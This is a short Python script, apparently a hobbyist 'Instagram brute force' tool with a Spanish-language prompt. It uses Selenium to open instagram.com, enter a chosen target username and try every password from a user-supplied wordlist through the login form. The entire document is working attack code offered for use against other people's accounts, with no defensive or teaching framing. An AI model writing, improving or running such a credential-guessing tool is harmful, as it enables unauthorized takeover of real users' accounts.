from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver import Chrome
from colorama import Fore
import time

big_text = """
╔══╗─────╔╗─────╔═══╗────────────╔╗
╚╣╠╝─────║║─────║╔═╗║────────────║║
─║║╔══╦╦═╝╠═╦══╗║║─╚╬══╦═╗╔═══╦══╣║╔══╦═══╗
─║║║══╬╣╔╗║╔╣╔╗║║║╔═╣╔╗║╔╗╬══║║╔╗║║║║═╬══║║
╔╣╠╬══║║╚╝║║║╚╝║║╚╩═║╚╝║║║║║══╣╔╗║╚╣║═╣║══╣
╚══╩══╩╩══╩╝╚══╝╚═══╩══╩╝╚╩═══╩╝╚╩═╩══╩═══╝
"""
print(Fore.YELLOW, big_text)

ig_usuario = input(f"{Fore.GREEN}Porfavor introduce un usuario: {Fore.RED}")
lista_palabras = input(f"{Fore.GREEN}Porfavor introduce un diccionario: {Fore.RED}")

s = Service("C:/Users/sgonz/PycharmProjects/insta-fuerza-b/driver/chromedriver")

driver = Chrome(service=s)
driver.get("https://instagram.com")
time.sleep(2)

username = driver.find_element(By.NAME, "username")
password = driver.find_element(By.NAME, "password")
login = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")

files = open(f'{lista_palabras}.txt')
username.send_keys(ig_usuario)

for clave in files:
    password.send_keys(clave)
    time.sleep(2)
    login.click()
    time.sleep(3)
    password.send_keys(Keys.BACK_SPACE * 20)
    time.sleep(2)

time.sleep(5)
driver.close()
